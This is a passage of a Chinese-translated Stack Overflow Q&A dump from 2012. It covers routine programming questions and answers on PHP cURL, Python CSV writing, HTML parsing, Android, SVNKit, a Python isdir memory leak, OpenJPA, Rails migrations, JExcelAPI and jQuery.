永远不要相信客户。切勿通过未加密的链接或不安全（不受信任）的客户端发送敏感数据。在您的场景中，您将需要维护一个能够管理其自身安全性的服务器端会话。例如，仅访问正确的学生详细信息。为该会话提供一个唯一的、非连续的密钥，将该密钥加盐并将其用作返回给客户端的会话 ID。当客户端进行进一步的交互时，使用该令牌来识别会话，但从不信任它来验证所有进一步的交互。这是您会话的工作。

*   [防御性编程的起点](http://en.wikipedia.org/wiki/Defensive_programming)，
*   [使用防御性编码技术保护您的应用程序和关键用户信息](http://msdn.microsoft.com/en-us/magazine/cc163883.aspx)，
*   [开发 Web 服务应用程序](http://www.redbooks.ibm.com/abstracts/redp4884.html?Open)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-28T23:57:18.990

您应该使用众所周知的算法（如 3DES 或 Rijndael）对通过网络传输的任何敏感信息进行加密，并在端点处解密。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-29T00:16:34.567

使用您的 WebAPI 的任何人都必须首先提供登录凭据。您应该使用会话变量和会话 cookie 在服务器端存储学生 ID 等信息。如果用户告诉您他们是学生“XYZ”，您应该能够在返回任何其他信息之前在服务器端对其进行验证。另外，请注意这仍然不安全，因为恶意用户仍然可以窥探客户端发送到服务器的数据包，并使用它来冒充您的用户。一个适当保护的系统应该对所有包含敏感数据的流量使用 HTTPS。

# php - MySQL显示多个数据并通过CURL

> ID：12648716
> 
> 赞同：0
> 
> 时间：2012-09-28T23:53:32.553
> 
> 标签：php, mysql, curl

我从数据库中获取所有行值“手机号码”并通过 CURL 将消息发送给多个收件人时遇到问题。

我试过调用 $row[contact_mobile] ，当我回显时，所有数据都会显示，但是当通过 CURL 传递数据库中的最后一个数字时。

所以我需要帮助来弄清楚如何通过数据库中的所有手机号码

这是我的代码：

```
 $SQL = "SELECT contact_mobile FROM sms_contacts WHERE group_id = '$group'";
    $result = mysql_query($SQL);
    while($row = mysql_fetch_array($result))
    {
    $groupsms = $row['contact_mobile'] . ",";
    }

    $url = "http://bulksms.2way.co.za:5567/eapi/submission/send_sms/2/2.0"; // URL to calc.cgi
            $fields = array(
            'site'=>'',
            'username'=>($username),
            'password'=>($password),
            'message'=>urlencode($text),
            'msisdn'=>urlencode($groupsms)

                            );
            $fields_string="?";
            //url-ify the data for the POST
            foreach($fields as $key=>$value) { $fields_string .= $key.'='.$value.'&'; }
            rtrim($fields_string,'&');

            //open connection
            $ch = curl_init();

            //set the url, number of POST vars, POST data
            curl_setopt($ch,CURLOPT_URL,$url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, false);
            curl_setopt($ch,CURLOPT_POST,count($fields));
            curl_setopt($ch,CURLOPT_POSTFIELDS,$fields_string);

                            // Check if all data shows
            echo $url.$fields.$fields_string;

            //execute post
            ob_start();
            curl_exec($ch);
            ob_end_clean(); 
```

我收到什么：

```
 http://bulksms.2way.co.za:5567/eapi/submission/send_sms/2/2.0Array?site=&username=xxxx&password=xxxx&message=the message&msisdn=44123456789%2C& 
```

它应该是什么样子

```
 http://bulksms.2way.co.za:5567/eapi/submission/send_sms/2/2.0Array?site=&username=xxxx&password=xxxx&message=the message&msisdn=44123456789,44213456789 
```

关于如何解决这个问题的任何建议？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-29T00:07:44.687

在将问题放在这里之前，您可能已经解决了更多问题......您只需要更换

```
$groupsms = $row['contact_mobile'] . ","; 
```

经过

```
$groupsms .= $row['contact_mobile'] . ",";
          ^ 
```

因为现在你正在分配`$groupsms`并`$row['contact_mobile'] . ","`因此只返回最后一个值。

# python - 如何将用户输入放入 CSV 文件？

> ID：12648717
> 
> 赞同：1
> 
> 时间：2012-09-28T23:53:51.490
> 
> 标签：python, csv

我的问题有很多排列，但最接近的答案是：

[如何将 Python 字典写入 csv 文件？](https://stackoverflow.com/questions/10373247/how-do-i-write-a-python-dictionary-to-a-csv-file)

不幸的是，每行打印输出如下：

```
matthew, green
rachel, blue
raymond, red 
```

其中 somedict = dict(raymond = "red", rachel = "blue", matthew = "green")

我的问题需要更多这样的输出：

```
why, date, story
"because", "sunday", "blah blah blah" 
```

我从用户输入中获取字典，重要的是输出文件将每个新答案（为什么、日期和故事）放在一个新行上（此外，列标题只打印一次）。所以我的代码如下所示：

```
import csv
o = "file.csv"
why = input("Why? ")
date = input("Date: ")
story = input("Story: ") 
```

总之，我需要如下所示的输出：

```
why, date, story
"because", "sunday", "blah blah blah"
"i don't know", "monday", "blah blah blue"
"third base", "monday", "blah blah blarg" 
```

我只是在寻找一种简单的方法来获取用户输入，将其写入 csv 文件中的新行。我已经在这里待了大约两个小时，所以这就是我在这里的原因。首先我遇到了两个 TypeError 错误：（1）'str' 不支持缓冲区接口（我通过在 with open(file, "wb", "utf-8") 语句中添加 "utf-8" 参数来解决这个问题）。(2) TypeError：需要整数。出于某种原因，我从“wb”中取出了“b”，它似乎摆脱了这个错误。我发布的链接让我几乎可以到达我需要的地方，但还不够，我真诚地感谢任何人可以提供的任何快速澄清。

**编辑**

为了清楚起见，我尝试了几种可能性。最有希望的是：

```
with open("file.csv", "w", encoding = "utf-8") as f:
    w = csv.writer(f)
    w.writerows(somedict.items()) 
```

它产生了我上面引用的第一个输出，这不是我需要的。

我也试过：

```
with open("file.csv", "w", encoding = "utf-8") as f:
    w = csv.writer(f)
    w.writerow(somedict.keys())
    w.writerow(somedict.values()) 
```

但这给了我：_csv.Error: sequence expected

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-29T00:58:35.777

如果您只想获取用户输入并将其写入 csv 文件中的新行，则无需字典即可。在字典中执行此操作实际上取决于字典的设置方式 - 如果您对此进行更多解释可能会有所帮助？如果这是我想象的方式，kalgasnik 的答案是一个很好的答案。

但是如果没有必要使用字典（我对您的问题的一般印象），这种方式非常简单：

```
import csv
with open('file.csv', 'w') as f:
    w = csv.writer(f, quoting=csv.QUOTE_ALL) 

    while (1):
        why = input("why? ")
        date = input("date: ")
        story = input("story: ")
        w.writerow([why, date, story]) 
```

它直接从用户输入产生您想要的输出。

**编辑**

这种方式设计用于您只是一遍又一遍地接收数据的情况，因此是 while (1)（永远循环）。如果您想一次接收一组，请完全删除 while 循环 - 这与在末尾添加一个 break 具有相同的效果。

如果您想在每次写入之间打开和关闭文件（例如，如果您将在其间做很多其他工作），那么在打开文件时使用 'a' 而不是 'w' 来追加，这将写入每个新行上的新字符串集。

这可能是一个示例，说明在最后将所有集合全部写入文件之前将所有集合存储在某个地方可能是个好主意，因为始终打​​开和关闭文件可能会很昂贵（我不知道这是否是您的考虑因素）。如果您仍然对字典感到不满意，您可以简单地将每个 [why, date, story] ​​列表添加到一个更大的列表中，然后在最后编写时循环遍历列表。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-29T00:45:27.693

“不幸的是，每行都像这样打印输出”-如果我理解正确，[这是您的解决方案](https://stackoverflow.com/a/10373268/1690891)

```
i1 = {"why": "because", "date": "sunday", "story": "blah blah blah"}
i2 = {"why": "i don't know", "date": "monday", "story": "blah blah blue"}
i3 = {"why": "third base", "date": "monday", "story": "blah blah blarg"}

keys = ("why", "date", "story")
with open('mycsvfile.csv','wb') as f:
    w = csv.DictWriter(f, keys)
    w.writeheader()
    for answer in (i1,i2,i3):
        w.writerow(answer) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-29T00:30:08.757

[csv.writer](http://docs.python.org/library/csv.html#csv.writer)的`quoting`参数控制写入时是否引用字段。如果您将此参数的值设置为[csv.QUOTE_ALL](http://docs.python.org/library/csv.html#csv.QUOTE_ALL)，那么您的所有字段都将被引用。

# php - html页面的组解析器

> ID：12648718
> 
> 赞同：0
> 
> 时间：2012-09-28T23:54:22.360
> 
> 标签：php, html, parsing, dom, simple-html-dom

html页面：

```
<div class="title-download">
    <div id="ctl " class="title">
        <h3>
            <a id="ct2" href="http://url1.com">title</a>
            <span id="ct3" class="citation">(<a id="ct4 " href=" ">Citations</a>)</span></h3>
    </div>
    <div id="ct4" class="download">
        <a id="ct5 " title=" " href="http://url.pdf" img id="ct6" class="small-icon" src=" " /></a>
    </div>
</div>
<div class="content">
    <a class="author " href="author.com">author</a><span class="span-break" >, </span><a class="author2.com " href="http://author2.com">author2</a>
</div> 
```

我想得到`http://url1.com`, `title`, `http://url.pdf`,如果只有类下载有 pdf url `author.com`。`author`

这是代码：

```
foreach($html->find('span[class=citation]') as $link1){
    foreach($link1->parent()->parent()->parent()->find('.download a') as $link2){
        foreach ($link1->parent()->find('div[class=content] a') as $a ){
            if(strtolower(substr($link2->title, strrpos($link2->href, '.'))) === '.pdf') {
                $link1 = $link1->prev_sibling();
                $a = $link1->next_sibling();
                $title = strip_tags($link1->plaintext);
                $linkWeb = strip_tags($link1->href);
                $author= strip_tags($a->plaintext);
                $linkAuthor= strip_tags($a->href); 
                $pdfLink = strip_tags($link2->title); 
            }
        }
    }
} 
```

我得到了空白结果，请您帮帮我，请告诉我错误的地方。提前致谢 ：）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-29T00:33:10.157

由于页面填充了具有类 title-download 的 div，因此您应该能够按如下方式重写循环：

```
foreach( $html->find('div[class=title-download]') as $div){
    $dowloadlink = $div->find('div[class=download] a', 0);

    if($dowloadlink != null){

        if(strtolower(substr($downloadlink->href, strrpos($downloadlink->href, '.'))) === '.pdf'){
            $content = $div->find('div[class=content] h3 a', 0);

            $title = strip_tags($content->plaintext);
            $linkWeb = strip_tags($content->href);

            $authorlink = $div->next_sibling().find('a', 0);
            $author = strip_tags($authorlink->plaintext);
            $linkAuthor= strip_tags($authorlink->href);

            $pdfLink = strip_tags($downloadlink->href); 
        }

    }

} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-29T00:00:15.583

您是否尝试过添加打印语句来尝试调试？快速浏览一下，您可以看到第三个循环：

```
foreach ($link1->parent()->parent()->find('div[class=content] a') as $a) { 
```

不会匹配任何东西，因为你不会回到足够远的地方（看起来它会在#ctl div？）。看起来你真的想在升级三个级别后寻找兄弟元素？

# iphone - AVPlayerItem 暂停直播 URL？

> ID：12648720
> 
> 赞同：1
> 
> 时间：2012-09-28T23:55:20.563
> 
> 标签：iphone, xcode, audio, audio-streaming, avplayer

我目前正在使用 AVPlayerItem 从 URL 播放实时流。我的代码是

```
- (void)viewDidLoad
{
    AVPlayerItem* playerItem = [AVPlayerItem playerItemWithURL:[NSURL URLWithString:@"http://s4.voscast.com:8080/"]];

    [playerItem addObserver:self forKeyPath:@"timedMetadata" options:NSKeyValueObservingOptionNew context:nil];

    AVPlayer* player = [[AVPlayer playerWithPlayerItem:playerItem] retain];
    [player play];

    [super viewDidLoad];
    // Do any additional setup after loading the view, typically from a nib.
}
- (void) observeValueForKeyPath:(NSString*)keyPath ofObject:(id)object
                         change:(NSDictionary*)change context:(void*)context {

    if ([keyPath isEqualToString:@"timedMetadata"])
    {
        AVPlayerItem* playerItem = object;

        for (AVMetadataItem* metadata in playerItem.timedMetadata)
        {
            NSLog(@"\nkey: %@\nkeySpace: %@\ncommonKey: %@\nvalue: %@", [metadata.key description], metadata.keySpace, metadata.commonKey, metadata.stringValue);
        }
    }
} 
```

有什么办法可以暂停，然后从中断的地方继续，允许快进重新开始生活？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-26T21:13:41.550

您可以使用`[player pause]`和`[player play]`暂停和恢复流式传输，但不能从您离开的点恢复为正常轨道（例如 mp3 文件）。您可以达到与关闭和使用汽车收音机相同的效果。

为了实现这一点，您应该在“暂停”期间在后台缓冲流，然后重现它，但我想它相当复杂。我不能帮你。

# android - 如何使用变量从原始文件夹访问视频？

> ID：12648722
> 
> 赞同：2
> 
> 时间：2012-09-28T23:55:47.483
> 
> 标签：android, variables, video, resources

这是我的代码：

```
VideoView vd;
vd = (VideoView) findViewById(R.id.videoview2);
String path = "android.resource://" + getPackageName() + "/"
                        + R.raw.video1;
                vd.setVideoURI(Uri.parse(path));
                vd.start(); 
```

这可行，但我希望 R.raw.video1 成为一个字符串，因为我有很多视频要播放。

所以我想要的是这个：

```
String videoResource = "R.raw.video1"
 String path = "android.resource://" + getPackageName() + "/"
                            + videoResource; 
```

不幸的是，这不起作用，我该如何让它工作？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-28T23:57:56.677

您需要资源的标识符才能使其工作，可以使用以下方法通过其名称检索：

```
int id = getResources().
    getIdentifier("name_of_resource", "id", getPackageName()); 
```

所以你的新代码会变成：

```
int videoResource = getResources().
    getIdentifier("video1", "raw", getPackageName());
String path = "android.resource://" + getPackageName() + "/" + videoResource; 
```

# java - SVNKit 日期之间的差异

> ID：12648732
> 
> 赞同：1
> 
> 时间：2012-09-28T23:57:27.093
> 
> 标签：java, svn, diff, svnkit

我正在尝试使用 SVNKit 做一个简单的：`svn diff url {date1}:{date2}`.
我不知道如何在 SVNKit 上使用它。有谁知道如何做到这一点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-30T15:05:03.023

SVNKit 的`SVNRevision`类有一个从 java.util.Date 实例构造它的静态方法，这是 SVN 的 {date} 的模拟。

运行差异

1\. 准备负责格式化补丁的差异生成器（支持 SVN 格式、Git 格式和 GNU 格式（带有 SvnNewGenerator 包装器））。最有趣的设置是基本路径——所有路径都是相对于它的，因为它是可能的（颠覆总是使用当前路径——新文件（“”）——但你可以使用任何其他路径）。

```
final SvnDiffGenerator diffGenerator = new SvnDiffGenerator();
diffGenerator.setBasePath(new File("")); 
```

2\. 为生成的补丁准备输出流

```
final OutputStream byteArrayOutputStream = new ByteArrayOutputStream(); 
```

3\. 运行差异

```
final SvnDiff diff = svnOperationFactory.createDiff();
diff.setSource(SvnTarget.fromURL(url), SVNRevision.create(date1), SVNRevision.create(date2));
diff.setDiffGenerator(diffGenerator);
diff.setOutput(byteArrayOutputStream);
diff.run(); 
```

您可以通过使用 SvnDiff 和 SvnDiffGenerator 设置器来发现更多设置。

# python - 重复 os.path.isdir 调用中的巨大内存泄漏？

> ID：12648737
> 
> 赞同：22
> 
> 时间：2012-09-28T23:58:33.053
> 
> 标签：python, memory-leaks, python-2.7, system-calls

我一直在编写与扫描目录有关的脚本，并在调用 os.path.isdir 时注意到严重的内存泄漏，因此我尝试了以下代码段：

```
def func():
    if not os.path.isdir('D:\Downloads'):
        return False
while True:
    func() 
```

在几秒钟内，Python 进程达到了 100MB RAM。

我试图弄清楚发生了什么。似乎只有当路径确实是有效的目录路径时，巨大的内存泄漏才有效（这意味着不执行“return False”）。此外，看看相关调用（如 os.path.isfile）中发生了什么也很有趣。

想法？

**编辑：** 我想我正在做某事。虽然 isfile 和 isdir 是在 genericpath 模块中实现的，但在 Windows 系统上 - isdir 是从内置的 nt 中导入的。所以我不得不下载 2.7.3 的源代码（我早就应该这样做了......）。

经过一番搜索，我在**\Modules\posixmodule.c中找到了****posix__isdir**函数，我认为它是从 nt 导入的 'isdir' 函数。

 **这部分功能（和评论）引起了我的注意：

```
if (PyArg_ParseTuple(args, "U|:_isdir", &po)) {
        Py_UNICODE *wpath = PyUnicode_AS_UNICODE(po);

        attributes = GetFileAttributesW(wpath);
        if (attributes == INVALID_FILE_ATTRIBUTES)
            Py_RETURN_FALSE;
        goto check;
    }
    /* Drop the argument parsing error as narrow strings
       are also valid. */
    PyErr_Clear(); 
```

似乎这一切都归结为 Unicode/ASCII 处理错误。

我刚刚用 unicode 中的路径参数尝试了上面的代码片段（即 u'D:\Downloads'） - 没有任何内存泄漏。哈哈。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-29T05:30:25.860

根本原因是调用非Unicode路径中`PyMem_Free`的变量失败：`path`

```
 if (!PyArg_ParseTuple(args, "et:_isdir",
                          Py_FileSystemDefaultEncoding, &path))
        return NULL;

    attributes = GetFileAttributesA(path);
    if (attributes == INVALID_FILE_ATTRIBUTES)
        Py_RETURN_FALSE;

check:
    if (attributes & FILE_ATTRIBUTE_DIRECTORY)
        Py_RETURN_TRUE;
    else
        Py_RETURN_FALSE; 
```

根据以下文档[`PyArg_ParseTuple`](http://docs.python.org/c-api/arg.html)：

> *   `et`: 和`es`...一样
> *   `es`:`PyArg_ParseTuple()`将分配所需大小的缓冲区，将编码数据复制到此缓冲区并调整 *buffer 以引用新分配的存储空间。*调用者负责`PyMem_Free()`在使用后调用以释放分配的缓冲区*。

这是 Python 标准库中的一个错误（在 Python 3 中通过直接使用字节对象修复）；[在http://bugs.python.org](http://bugs.python.org)提交错误报告。**

# ldap - Jira 不会从 OpenLDAP 自动添加用户

> ID：12648749
> 
> 赞同：0
> 
> 时间：2012-09-29T00:00:38.393
> 
> 标签：ldap, jira, openldap

我在 OpenLDAP 中设置了许多用户。我已将 Jira 设置为只读、本地组，并将自动添加组设置为 jira-users。但是，它不会自动将任何用户添加到组中，而是告诉他们他们没有登录权限。用户不在 OpenLDAP 中的任何组中（我不希望添加新组并修改其他组）软件将它们创建到组中）。如果用户根本不在任何组中，Jira 似乎不会费心添加用户。有解决方法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-30T07:42:05.083

我想不是。当您以这种方式配置 Jira 时，它应该完全依赖 OpenLDAP 服务器，因为所有用户权限/权限/组设置功能都委托给服务器。

如果您`jira-users`在 OpenLDAP 中创建一个组，它应该可以正常工作。

# jpa - openJPA IN 参数类型作为集合

> ID：12648755
> 
> 赞同：1
> 
> 时间：2012-09-29T00:01:17.470
> 
> 标签：jpa, openjpa

使用openJPA时可以作为参数给出吗`List<Long>`？`IN`

我使用的数据库是 MySQL 最新版本。我正在尝试工作的示例查询如下，并且还粘贴了我得到的错误。请让我知道我需要做什么才能使其正常工作。

```
Select * from table t where c in (?) 
```

```
.createNativeQuery(TOPIC)
.setParameter(1, listNo) 
```

`listNo`在哪里`List<Long>`。

### 错误

> 19:46:47,376 错误 [org.jboss.ejb3.invocation] (http--127.0.0.1-8080-6) JBAS014134：EJB 调用在组件 TopicService 上失败，用于方法公共抽象 com.zreflect.emyed.vo.circle.TopicVO [] com.zreflect.emyed.ejb.interfaces.ITopicService.getSelectedTopics(long,java.util.List,com.zreflect.emyed.vo.UserSession): javax.ejb.EJBException: <openjpa-2.2.0-r422266: 1244990 非致命用户错误> org.apache.openjpa.persistence.ArgumentException：“class java.util.ArrayList”类型的指定参数不是有效的查询参数。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-30T15:30:16.427

您没有指定片段是 JPQL 还是原始 SQL。还有另外两种构建查询的方法：NamedQueries 或 CriteriaBuilder。可能更多。

我认为最简单的方法是使用 JPQL 查询。

```
String JPQL = "Select * from table t where c in (:value)"

ArrayList<Integer> myList = new ArrayList<Integer>();
myList.add(1); 
```

您可以使用以下方法：

```
TypedQuery.setParameter("value",myList); 
```

请参阅： [http ://docs.oracle.com/javaee/6/api/javax/persistence/TypedQuery.html#setParameter%28java.lang.String,%20java.lang.Object%29](http://docs.oracle.com/javaee/6/api/javax/persistence/TypedQuery.html#setParameter%28java.lang.String,%20java.lang.Object%29)

但是：列表总是需要至少有一项。我认为空列表不起作用，或者产生错误的 SQL 语句。

塞巴斯蒂安

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-30T22:40:53.307

我已将数组转换为以逗号分隔的字符串并传递了参数值。

它现在以这种方式工作，因为本机查询不支持数组。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-11-25T08:14:14.253

参数表达式怎么样？如何使用 ParameterExpression 和 TypedQuery.setParameter 构造“in”表达式？

# ruby-on-rails - Rails：为什么要使用数据库迁移？

> ID：12648756
> 
> 赞同：0
> 
> 时间：2012-09-29T00:01:41.403
> 
> 标签：ruby-on-rails

在 Rails 中，我们可以创建数据库迁移来修改数据库列，例如`add_column`. 但是我们也可以直接编辑db/migrate中的数据库文件。那么我们是否每次都写迁移而不是更改数据库文件？

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-29T00:04:46.723

db/migrate 中的文件是`generate migration`命令生成的文件

您可以使用该命令来加快速度，因为 Rails 更喜欢约定而不是配置。这是铁路的方式。

但是如果你想手动做一些事情或者做一些更复杂的事情，你可以手动编辑 db/migrate 中的文件，甚至添加新文件。之后，您必须运行`rake db:migrate`命令将更改提交到数据库。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-29T00:11:29.507

理论上，您可以将其视为拥有数百万行的生产数据库。每次您想更改或添加数据库时，您都想修改另一个文件并应用这些更改，以免丢失该数据。

如果您只是编辑一个 db/migrate 文件，例如从上周开始，首先它不会被拾取，`bundle exec rake db:migrate`但您必须回滚这些更改，这会破坏数据。

因此，要在一行中回答问题，请继续添加迁移，即使是简单的更改。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-29T00:28:15.367

从 schema.rb 或初始创建数据库迁移重建数据库将破坏您的所有数据。将增量更改部署到生产系统需要迁移。在您的开发周期中，我不会使用它们。为测试/开发数据使用模拟、固定装置或工厂。

# java - 使用 Java 和 Jexcelapi 从 Excel 写入多个 CSV 文件

> ID：12648762
> 
> 赞同：1
> 
> 时间：2012-09-29T00:02:54.817
> 
> 标签：java, jexcelapi

我正在尝试创建一个程序，将所有数据从 excel 写入多个 csv 文件。

目前，我的程序创建了*n*个文件，并且只有最后一行 excel 被写入最后一个 csv 文件。

### 编程背景观察：

文件似乎正在写入。但是对于每个写入的行，它会以某种方式创建相同的文件 250 次。它会擦除最后写入的行。

我在使用**OutputStream**或**BufferedWriter**时可能会遇到一些问题。我只是无法弄清楚它是什么。

**writeRow() 方法：**

```
public static void writeRow(BufferedWriter bw, Cell[] row) throws IOException { 
    if (row.length > 0) {
        bw.write(row[0].getContents());
        for (int j = 1; j < row.length; j++) {
            bw.write(',');
            bw.write(row[j].getContents());
        }
    }
} 
```

**setFile() 方法：**

```
public static BufferedWriter setFile (int i) throws IOException {
    i=i/250;
    File f = new File(dir + "file-" + (i+1) + ".csv");
    // If i has changed, create a new file. Else, append to current file.
    String encoding = "UTF8";
    OutputStream os = null;
    OutputStreamWriter osw = null;
    BufferedWriter bw = null;
    Boolean append = null;
    try {
        // If i has changed, create a new file, else append.
        if (i%250==0) {
            append = new Boolean("TRUE");
            os = new FileOutputStream(f,append);
        } else {
            append = new Boolean("FALSE");
            os = new FileOutputStream(f, append);
        }
        osw = new OutputStreamWriter(os, encoding);
        bw = new BufferedWriter(osw);

    } finally {
        os.close();
        osw.close();
    }
    return bw;
} 
```

**以下是例外情况。**

```
Exception in thread "main" java.io.IOException: Stream closed
at sun.nio.cs.StreamEncoder.ensureOpen(Unknown Source)
at sun.nio.cs.StreamEncoder.write(Unknown Source)
at java.io.OutputStreamWriter.write(Unknown Source)
at java.io.BufferedWriter.flushBuffer(Unknown Source)
at java.io.BufferedWriter.flush(Unknown Source)
at Main.main(Main.java:46) 
```

以下是代码的一些链接。

我究竟做错了什么？

这是svn主干：

[https://franz-opensource.googlecode.com/svn/trunk/ExcelToCsv](https://franz-opensource.googlecode.com/svn/trunk/ExcelToCsv) -

*   [单击此处获取与上述类似的 Java 主代码](http://code.google.com/p/franz-opensource/source/browse/trunk/ExcelToCsv/src/Main.java)。
*   [单击此处下载示例 excel 文件](http://code.google.com/p/franz-opensource/downloads/detail?name=inventory.xls&can=2&q=)
*   [点击这里下载 jexcelapi](http://sourceforge.net/projects/jexcelapi/files/jexcelapi/2.6.12/jexcelapi_2_6_12.zip/download)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-02T17:56:23.047

**重要建议：不要在同一个缓冲区上写入，而是在每***n*条记录 之后停止行。然后，再次阅读工作表。然后，在另一个文件上输出缓冲区。在同一个缓冲区上写入时，您无法更改文件。

这是一个整体的解决方案：

**静态变量：**

```
public static int maxRecords = 250;
public static String directory = "C:\\Users\\User02\\workspace\\ExcelToCsv\\src\\";
public static String inputFile = directory + "inventory.xls"; 
```

**主要的：**

```
public static void main(String[] args) throws BiffException, IOException {
Sheet s = getSheet();
    int countRows = s.getRows(); // counts the number of rows in the sheet.
    int numberOfFiles = (countRows/maxRecords)+1;

    for(int file=0; file<numberOfFiles; file++) {
        System.out.println("Create file number " + (file+1));
        int fileNumber = file+1;
        System.out.println("Start number: " + ((file*maxRecords)+1));
        int startNumber = (file*maxRecords);
        populateFile(fileNumber,startNumber);
        System.out.println("");
    }
} 
```

**填充列表：**

```
public static void populateFile(int fileNumber, int startNumber) 
    throws IOException, BiffException {
        BufferedWriter bw = setFile(fileNumber);
        Sheet s = getSheet();
        Cell[] row = null;
        writeRow(bw,s.getRow(0));
        bw.newLine(); 
        int limit = getLimit(s,startNumber);
        System.out.println("End Number:" + limit);
        System.out.println();
        for (int i = startNumber; i < limit ; i++) {
            row = s.getRow(i); 
            //System.out.println(i);
            writeRow(bw,row);
            bw.newLine();
        }
        bw.flush();
        bw.close();
    } 
```

**获取工作表：**

```
public static Sheet getSheet() throws BiffException, IOException {
    WorkbookSettings ws = new WorkbookSettings();
    ws.setLocale(new Locale("en", "EN"));
    Workbook w = Workbook.getWorkbook(new File(inputFile),ws);
    Sheet s = w.getSheet(0);
    return s;
} 
```

**设置要写入的文件：**

```
public static BufferedWriter setFile(int fileNumber) throws IOException {
    String csvFilename = directory + "file-"+ fileNumber +".csv";
    FileWriter csvFile = new FileWriter(csvFilename);
    BufferedWriter bw = new BufferedWriter(csvFile);
    return bw;
} 
```

**获得极限：**

```
public static int getLimit(Sheet s, int startNumber) {
    int limit;
    int countRows = s.getRows();
    if (startNumber+maxRecords<=countRows) {
        limit = startNumber + maxRecords;
    } else {
        limit = startNumber + (countRows-startNumber);
    }
    return limit;
} 
```

**将行写入文件：**

```
public static void writeRow(BufferedWriter bw, Cell[] row) throws IOException { 
    if (row.length > 0) {
        bw.write(row[0].getContents());
        for (int j = 1; j < row.length; j++) {
            bw.write(',');
            bw.write(row[j].getContents());
        }
    }
} 
```

# android - Android HTTP 获取和结果字符串

> ID：12648763
> 
> 赞同：0
> 
> 时间：2012-09-29T00:03:01.307
> 
> 标签：android, http-get

我是 android 开发方面的新手，我知道我想尝试的一件事是如何使用 HTTP Get。我已经设置了整个方法，以便发送文本并且我的结果以字符串形式返回，但我想知道的是如何获取该字符串并仅提取我真正需要的部分。例如字符串回来了

```
{"id":"124343","name":"somename" } 
```

如果我只是想获得该开始的 id 部分，我将如何在 android 中做到这一点。我正在搜索文档，但到目前为止我还没有真正找到任何东西，然后我发现的大部分内容也都围绕着使用 JSON。

下面是我目前正在使用的代码（我已经从几个不同的帖子一起编译）但也许我需要切换到使用 JSON 进行解析，我只是不确定在哪里进行更改

```
 //This class is called after a button is pressed and the HTTPGet string is compiled from text within a textview and a static string (this already works)
     private class LongRunningGetIO extends AsyncTask<Void, Void, String> {
    protected String getASCIIContentFromEntity(HttpEntity entity)
            throws IllegalStateException, IOException {
        InputStream in = entity.getContent();
        StringBuffer out = new StringBuffer();
        int n = 1;
        while (n > 0) {
            byte[] b = new byte[4096];
            n = in.read(b);
            if (n > 0)
                out.append(new String(b, 0, n));
        }
        return out.toString();
    }

    @Override
    protected String doInBackground(Void... params) {
        HttpClient httpClient = new DefaultHttpClient();
        HttpContext localContext = new BasicHttpContext();
        String question = questionText.getText().toString();
        String newString = httpPath + "?userText=" + question;
        Log.i("Message", newString);
        HttpGet httpGet = new HttpGet(newString);
        String text = null;
        try {
            HttpResponse response = httpClient.execute(httpGet,
                    localContext);
            HttpEntity entity = response.getEntity();
            text = getASCIIContentFromEntity(entity);

        } catch (Exception e) {
            return e.getLocalizedMessage();
        }
        return text;
    }

    protected void onPostExecute(String results) {
        if (results != null) {
            Log.i("String", results);
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-29T00:06:39.070

这是从 JSON 字符串中提取数据的方法

```
JSONObject obj =  new JSONObject(YourJSONString);
String id = obj.getString("id");
String name = obj.getString("name"); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-29T06:12:53.703

这是你想要的吗：：

```
HttpGet httpGet = new HttpGet(newString);
String text = null;
    try {
          HttpResponse response = httpClient.execute(httpGet, localContext);
          InputStream content = response.getEntity().getContent();
          BufferedReader buffer = new BufferedReader(new InputStreamReader(content));

          while ((text = buffer.readLine()) != null) {

              //Work with "text" here...
             //Split the string as you wish with "text.split();" function..

             }
         } catch (Exception e) {
            return e.getLocalizedMessage();
         } 
```

# jquery - 用图像替换一个字母而不用 Jquery 破坏文本流

> ID：12648764
> 
> 赞同：0
> 
> 时间：2012-09-29T00:03:04.797
> 
> 标签：jquery, graphical-logo, letter

**对象：**我有一个标题标题，我只想用图像徽标替换其中的一个字母。

**问题：**在使用`<span>`它以某种方式破坏了我的设计之后，我的意思是它断线，没有正确替换字母但出现在其他地方。我知道这是定位，但很多方法都直接付诸东流。有人有想法吗？

我的脚本，非常基本：

```
<script type="text/javascript">
      $(function() {
            $('#logo span').fadeOut(7000);
            $('#logo span 2').fadeIn(2000);
      });
    </script> 
```

我的CSS：

```
 <style>
     #logo .span 2 {display:none}
    </style> 
```

我的html：

```
<!-- Header & Call to Action Area -->
<div id="logo"><a href="index.html">Mundo<img class="logo" src="pictures/logos/logo_mundo_krone_header.png" width="100" height="56" alt="logo kundo gourmet puerto varas,restaurant puerto varas,puerto varas lujo,extravagante puerto varas" /><br />Gour<span><span class="2"><img src="pictures/logos/logo_mundo_krone_header.png" width="100" height="56" /></span>m</span>et</a></div> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-29T02:08:14.443

啊...我知道这里出了什么问题。你是说`span 2`，字面意思。这不是一个有效的选择器。您需要做的是以下内容。

```
$('#logo span').eq(0).fadeOut(7000); 
```

jQuery 使用从零开始的索引。在这里，我们告诉 jQuery 我们希望第一个 span 淡出。

```
